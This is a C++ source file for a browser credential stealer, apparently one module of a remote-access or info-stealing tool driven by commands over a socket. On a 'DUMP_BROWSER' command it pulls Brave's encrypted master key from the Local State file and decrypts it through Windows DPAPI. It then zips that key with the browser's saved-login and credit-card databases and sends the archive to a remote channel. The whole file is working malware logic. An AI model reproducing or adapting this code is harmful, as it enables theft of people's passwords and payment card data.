#include "CredentialsExtractor.h"

CredentialsExtractor::CredentialsExtractor(ClientSocket &clientSocket, Download &download)
        : Handler(clientSocket), download(download) {
    ActionMap& actionMap = clientSocket.getActionMap();
    actionMap["DUMP_BROWSER"] = [&](nlohmann::json& json) {
        threadGen.runInNewThread(this, &CredentialsExtractor::sendKeyAndDatabase, json);
    };
}


std::vector<BYTE> CredentialsExtractor::decryptAESKey(const std::string& encryptedDataStr) {
    std::vector<BYTE> encryptedData(encryptedDataStr.begin(), encryptedDataStr.end());
    DATA_BLOB input;
    DATA_BLOB output;

    std::vector<BYTE> decryptedData; // Vector para guardar los datos descifrados

    input.pbData = const_cast<BYTE*>(encryptedData.data());
    input.cbData = static_cast<DWORD>(encryptedData.size());

    if (CryptUnprotectData(&input, nullptr, nullptr, nullptr, nullptr, 0, &output)) {
        decryptedData.assign(output.pbData, output.pbData + output.cbData);
        LocalFree(output.pbData);
    } else {
        DWORD dwErr = GetLastError();
        std::cerr << "CryptUnprotectData failed. Error: " << dwErr << std::endl;
    }

    return decryptedData;
}


std::vector<BYTE>  CredentialsExtractor::getDecryptedKey() {
    std::ifstream ifs("C:\\Users\\javier\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Local State");
    std::string content((std::istreambuf_iterator<char>(ifs)), (std::istreambuf_iterator<char>()));
    std::string key = "encrypted_key";
    std::size_t pos = content.find(key);
    if (pos == std::string::npos) {
        //return BYTE;
    }

    std::size_t start = content.find('"', pos + key.length() + 1);
    if (start == std::string::npos) {
        //return 1;
    }

    std::size_t end = content.find('"', start + 1);
    if (end == std::string::npos) {
       // return "";
    }
    macaron::Base64 base64;
    std::string encryptedString64 = content.substr(start + 1, end - start - 1);
    std::string encryptedStringDecoded;
    macaron::Base64::Decode(encryptedString64,encryptedStringDecoded);
    std::vector<BYTE> decryptedKey = decryptAESKey(encryptedStringDecoded.substr(5));

    return decryptedKey;
}

void CredentialsExtractor::sendKeyAndDatabase(nlohmann::json json) {
    std::vector<BYTE> decryptedKey = getDecryptedKey();
    std::cout << decryptedKey.size() << std::endl;
    std::string pathOfAccountsDatabase = R"(C:\Users\javier\Desktop\Login Data)";
    std::string pathOfCreditCardsDatabase = R"(C:\Users\javier\Desktop\Web Data)";
    std::vector<std::filesystem::path> pathsToZip = {pathOfAccountsDatabase, pathOfCreditCardsDatabase};
    std::vector<uint8_t> data = ZipCompressor::createZipInMemory(pathsToZip, decryptedKey, "encrypted key");
    download.downloadContentFromVector(data,json["channel_id"]);
    //RESULT result;
    //stream.sendBytes(decryptedKey);
    //stream.sendFile(Converter::string2wstring(pathOfAccountsDatabase).c_str(), result);
    //stream.sendFile(Converter::string2wstring(pathOfCreditCardsDatabase).c_str(), result);
}


